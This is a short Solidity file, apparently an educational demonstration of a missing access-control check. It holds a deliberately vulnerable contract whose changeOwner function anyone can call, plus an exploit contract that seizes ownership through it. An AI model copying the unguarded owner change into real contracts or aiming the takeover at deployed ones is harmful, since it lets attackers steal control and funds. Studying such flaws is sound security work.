// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Access Control Issues
contract AccessControlVictim {
    address public owner;
    constructor() {
        owner = msg.sender;
    }
    function changeOwner(address newOwner) public {
        owner = newOwner;  // No access check
    }
}

contract AccessControlExploit {
    AccessControlVictim victim;
    constructor(address _victim) {
        victim = AccessControlVictim(_victim);
    }
    function exploit() public {
        victim.changeOwner(msg.sender); // Anyone can change owner
    }
}
